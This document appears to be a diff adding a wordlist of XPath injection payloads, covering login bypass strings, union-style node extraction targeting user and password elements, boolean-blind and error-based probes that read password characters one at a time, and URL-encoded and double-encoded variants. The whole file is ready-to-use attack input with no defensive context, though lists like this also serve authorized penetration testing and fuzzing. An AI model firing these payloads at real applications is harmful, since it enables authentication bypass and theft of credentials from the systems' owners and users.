@@ -1,0 +1,47 @@
+# Generic XPath injection advanced payloads
+' or '1'='1
+" or "1"="1
+' or 1=1 or 'x'='y
+'] | //* | //foo[foo='
+' or count(/*)>0 or 'a'='b
+' or name(/*)='users' or 'a'='b
+' or string-length(name(/*))>0 or 'a'='b
+' and '1'='2
+' or contains(name(/*),'') or 'a'='b
+')] | //user/*[('
+admin' or '1'='1
+admin') or ('1'='1
+*' or '*'='*
+' or true() or '
+'] | //password | //foo[foo='
+# URL-encoded variants
+%27+or+%271%27%3d%271
+%27+or+1%3d1+or+%27x%27%3d%27y
+%27%5d+%7c+%2f%2f*+%7c+%2f%2ffoo%5bfoo%3d%27
+%27+or+count(%2f*)%3e0+or+%27a%27%3d%27b
+# Additional injection patterns
+') or ('1'='1
+' or substring(name(),1,1)='a
+' or substring(//user[1]/username,1,1)='a
+x' or name()='username' or 'x'='y
+' and contains(//user[1]/password,'a') or 'x'='x
+# Double URL-encoded
+%2527+or+%25271%2527%253d%25271
+# Boolean-based blind XPath
+' and '1'='1' and '1'='1
+' and '1'='2' or '1'='1
+' and boolean(//user[1]/admin='true') or '1'='2
+# Error-based XPath
+' and (1 div 0)='1
+' and string-to-number('a')=0 or '1'='1
+# UNION-style extraction
+' | //user | //foo[foo='
+'] | //user/* | //foo[foo='
+' or //admin | //foo['x'='
+# Wildcard
+//*
+//*[local-name()='user']
+//*[contains(local-name(),'pass')]
+# Numeric context
+1 or 1=1
+1 or '1'='1
